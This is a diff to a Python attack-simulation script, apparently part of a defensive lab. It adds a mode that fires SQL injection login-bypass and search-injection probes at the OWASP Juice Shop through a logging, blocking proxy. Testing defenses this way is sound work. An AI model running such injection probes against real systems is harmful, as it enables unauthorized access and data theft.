@@ -7,13 +7,15 @@ Modos:
   ddos          — Volume alto de requests concorrentes
   exfil         — Tenta dump completo via /pg/query
   privesc       — User comum tenta acessar tabela sensível
-  full          — Roda todos sequencialmente
+  full          — Roda todos sequencialmente (contra o server.py caseiro)
+  juice-shop    — SQLi contra o OWASP Juice Shop, via proxy (alvo :9000)
 
 Uso:
   python -m access_defense.attacker --mode sqli
   python -m access_defense.attacker --mode brute-force --rounds 50
   python -m access_defense.attacker --mode ddos --concurrency 20 --requests 200
   python -m access_defense.attacker --target http://localhost:8000 --mode full
+  python -m access_defense.attacker --target http://localhost:9000 --mode juice-shop
 """
 
 from __future__ import annotations
@@ -226,6 +228,45 @@ def attack_privesc(target: str) -> AttackReport:
 
 
 # ============================================================================
+# ALVO OWASP — JUICE SHOP (via proxy.py)
+# ============================================================================
+
+# Endpoints nativos do OWASP Juice Shop (estáveis, documentados pela OWASP).
+# Mesma classe de ataque do attack_sqli, só que contra o app OWASP real —
+# o request passa pelo proxy (:9000), que loga em access_logs e aplica o 403.
+JUICESHOP_LOGIN = "/rest/user/login"
+JUICESHOP_SEARCH = "/rest/products/search"
+
+
+def attack_juiceshop(target: str) -> AttackReport:
+    """SQLi contra o Juice Shop. Reusa os payloads do attack_sqli; muda só o
+    caminho e os nomes de campo (o Juice Shop fala email/data em vez de
+    username/rows). Aponte --target para o proxy, ex.: http://localhost:9000.
+    """
+    report = AttackReport(mode="juice-shop")
+    started = time.perf_counter()
+
+    # 1) SQLi no login — auth-bypass pelo campo 'email'.
+    #    Sucesso = Juice Shop devolveu token de autenticação.
+    for payload in SQLI_LOGIN_PAYLOADS:
+        body = {"email": payload["username"], "password": payload["password"]}
+        resp = _post(target, JUICESHOP_LOGIN, body)
+        _tally(
+            report, resp,
+            lambda b: bool((b.get("authentication") or {}).get("token")),
+        )
+
+    # 2) SQLi na busca de produtos — injeção via querystring 'q'.
+    #    Sucesso = retornou linhas na chave 'data'.
+    for payload in SQLI_SEARCH_PAYLOADS:
+        resp = _get(target, JUICESHOP_SEARCH, {"q": payload})
+        _tally(report, resp, lambda b: len(b.get("data", [])) > 0)
+
+    report.duration_s = round(time.perf_counter() - started, 3)
+    return report
+
+
+# ============================================================================
 # CLI
 # ============================================================================
 
@@ -237,6 +278,7 @@ MODES = {
     "ddos": lambda t: attack_ddos(t),
     "exfil": attack_exfil,
     "privesc": attack_privesc,
+    "juice-shop": attack_juiceshop,
 }
 
 
@@ -254,7 +296,9 @@ def main():
     args = parser.parse_args()
 
     if args.mode == "full":
-        reports = [fn(args.target) for fn in MODES.values()]
+        # 'full' ataca o server.py caseiro; juice-shop tem endpoints próprios
+        # e alvo próprio (o proxy :9000), então fica de fora e é rodado à parte.
+        reports = [fn(args.target) for name, fn in MODES.items() if name != "juice-shop"]
     elif args.mode == "brute-force":
         reports = [attack_brute_force(args.target, rounds=args.rounds)]
     elif args.mode == "ddos":
